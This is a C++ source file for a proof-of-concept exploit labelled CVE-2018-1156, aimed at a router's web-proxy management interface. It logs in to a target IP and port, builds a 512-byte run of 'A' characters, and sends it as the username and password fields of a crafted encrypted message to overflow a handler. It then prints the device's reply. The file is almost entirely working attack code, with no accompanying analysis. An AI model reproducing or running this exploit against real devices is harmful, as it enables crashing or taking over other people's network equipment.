#include <cstdlib>
#include <iostream>
#include <boost/cstdint.hpp>
#include <boost/program_options.hpp>

#include "jsproxy_session.hpp"
#include "winbox_message.hpp"

namespace
{
    const char s_version[] = "CVE-2018-1156 PoC 1.0.0";

    bool parseCommandLine(int p_argCount, const char* p_argArray[],
                          std::string& p_username, std::string& p_password,
                          std::string& p_ip, std::string& p_port)
    {
        boost::program_options::options_description description("options");
        description.add_options()
        ("help,h", "A list of command line options")
        ("version,v", "Display version information")
        ("username,u", boost::program_options::value<std::string>(), "The user to log in as")
        ("password", boost::program_options::value<std::string>(), "The password to log in with")
        ("port,p", boost::program_options::value<std::string>()->default_value("80"), "The HTTP port to connect to")
        ("ip,i", boost::program_options::value<std::string>(), "The IPv4 address to connect to");

        boost::program_options::variables_map argv_map;
        try
        {
            boost::program_options::store(
                boost::program_options::parse_command_line(
                    p_argCount, p_argArray, description), argv_map);
        }
        catch (const std::exception& e)
        {
            std::cerr << e.what() << "\n" << std::endl;
            std::cerr << description << std::endl;
            return false;
        }

        boost::program_options::notify(argv_map);
        if (argv_map.empty() || argv_map.count("help"))
        {
            std::cerr << description << std::endl;
            return false;
        }

        if (argv_map.count("version"))
        {
            std::cerr << "Version: " << ::s_version << std::endl;
            return false;
        }

        if (argv_map.count("username") && argv_map.count("ip") &
            argv_map.count("port"))
        {
            p_username.assign(argv_map["username"].as<std::string>());
            p_ip.assign(argv_map["ip"].as<std::string>());
            p_port.assign(argv_map["port"].as<std::string>());

            if (argv_map.count("password"))
            {
                p_password.assign(argv_map["password"].as<std::string>());
            }
            else
            {
                p_password.assign("");
            }
            return true;
        }
        else
        {
            std::cerr << description << std::endl;
        }

        return false;
    }
}

int main(int p_argc, const char** p_argv)
{
    std::string username;
    std::string password;
    std::string ip;
    std::string port;
    if (!parseCommandLine(p_argc, p_argv, username, password, ip, port))
    {
        return EXIT_FAILURE;
    }

    JSProxySession jsSession(ip, port);
    if (!jsSession.connect())
    {
        std::cerr << "Failed to connect to the remote host" << std::endl;
        return EXIT_FAILURE;
    }

    if (!jsSession.negotiateEncryption(username, password))
    {
        std::cerr << "Encryption neogitiation failed." << std::endl;
        return EXIT_FAILURE;
    }

    std::string build;
    for (int i = 0; i < 0x200; i++)
    {
        build.push_back('A');
    }

    WinboxMessage msg;
    msg.set_to(55);
    msg.set_command(1);
    msg.set_request_id(1);
    msg.set_reply_expected(true);
    msg.add_string(1, build); // username
    msg.add_string(2, build); // password
    msg.add_boolean(7, true);
    msg.add_u32(3, 1);
    msg.add_u32(6, 1);

    jsSession.sendEncrypted(msg);
    msg.reset();

    jsSession.recvEncrypted(msg);
    std::cout << msg.serialize_to_json() << std::endl;

    return EXIT_SUCCESS;
}
 
